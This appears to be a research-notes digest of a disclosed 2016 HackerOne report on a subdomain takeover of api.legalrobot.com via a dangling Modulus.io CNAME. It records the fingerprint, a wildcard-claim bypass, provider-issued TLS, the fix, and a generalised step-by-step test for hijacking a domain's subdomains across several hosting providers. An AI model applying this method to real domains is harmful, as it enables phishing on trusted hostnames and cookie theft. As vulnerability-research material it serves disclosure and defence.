SOURCE: https://hackerone.com/reports/148770  2026-11-13 (submitted 2016-07-01, disclosed 2016-08-26; Legal Robot; reporter `fransrosen` (Frans Rosén); title "Subdomain takeover at api.legalrobot.com due to non-used domain in Modulus.io."; weakness "Violation of Secure Design Principles"; `visibility: full`, VI 1,703 B read IN FULL via the live H1 `.json` — FIRST route worked; 33 votes)
STATUS: UNVERIFIED (not reproduced — no Modulus account was created and no DNS claim was made this pass; every quote below is verbatim from the fetched body)
CLASS: subdomain takeover (dangling CNAME to the Modulus.io PaaS) with a WILDCARD-CLAIM BYPASS — when the provider refuses the exact FQDN ("it was already added somewhere"), claim `*.parent` instead (no domain-ownership verification), and EVERY subdomain of the parent resolving to the provider serves the attacker's app, WITH provider-issued TLS
CORE METHOD:
  1. THE FINGERPRINT (verbatim): "the following domain: api.legalrobot.com was returning the following information: `NO APPLICATION WAS FOUND FOR api.legalrobot.com` from Modulus.io" — dangling DNS + the provider's unclaimed-instance page.
  2. THE CLAIM (verbatim): "I ... create[d] a new account on Modulus, and saw the following setup when I created my own application ... I tried adding the specific domain, but it said it was already added somewhere."
  3. THE BYPASS (verbatim): "The problem was that I then tried with the wildcard: `*.legalrobot.com`, and that actually worked" — "Which also made the page resolve my app" — proof (verbatim): `Hello World!<!--FRANS ROSEN-->` at `https://api.legalrobot.com/`.
  4. THE TLS AMPLIFIER (verbatim): "please note that Modulus will actually resolve the domain serving SSL, which is a really bad thing" — the hijack is served over HTTPS on the victim's own hostname (no cert warning).
  5. THE FIX (verbatim): "You should not point subdomains to services you do not use (yet)" and "remove the DNS post, or let me know if I should remove the wildcard-domain so you could claim it in this service ... which would probably prevent you completely from risking that subdomains will be taken over."
DETECTION SIGNAL: a host returning a hosting provider's "no application / no such bucket / not found" page (unclaimed-instance fingerprint) while its CNAME/A points at that provider's infra; on the provider, an "add custom domain" flow that refuses the exact FQDN ("already added / in use") — the wildcard parent claim is the bypass to test.
CHAIN: dangling CNAME on api.legalrobot.com (primitive) -> provider account + app + exact-FQDN claim REFUSED (primitive: the "already added" guard looks like protection) -> wildcard `*.legalrobot.com` claim succeeds (escalation: EVERY subdomain of the parent resolving to Modulus now serves attacker content — including subdomains created later) -> provider-issued TLS on the victim hostname (escalation: HTTPS on the victim origin, no cert warning) -> trusted-origin content = phishing/login forms on a first-party hostname ("Creating a login form that would fool anyone" is the recorded family impact — ledger 14157's Vine entry), parent-domain cookie theft / trusted-origin chains per §1.6. Recorded as the report states it: researcher explicitly declined bounty; noted the provider would add the wildcard to its scanner.
TRANSFERABLE TEST: (1) fingerprint every dangling CNAME against the provider's unclaimed-instance page (`NO APPLICATION WAS FOUND FOR <host>` — Modulus; `NoSuchBucket` — S3; "There isn't a GitHub Pages site here"; Heroku "no-such-app"...); (2) on the provider, claim the EXACT host first — if refused with "already added / in use", claim `*.parent.domain` instead (2016-era PaaS rarely verify ownership) and re-resolve EVERY subdomain of the parent: one wildcard claim can hijack all of them; (3) confirm over HTTPS (auto-TLS) and test whether later-created subdomains also land on the attacker app; (4) if the provider refuses claims entirely, the dangling record is still the vendor-side finding to report. Rule: **the exact-FQDN claim is not the only claim — when the provider says the domain is "already added", the wildcard parent is the bypass, and one wildcard claim hijacks the parent's entire subdomain estate, with TLS.**
DEDUPE/DELTA: DELTA over the recorded dangling-CNAME claim family — no §17 slot.
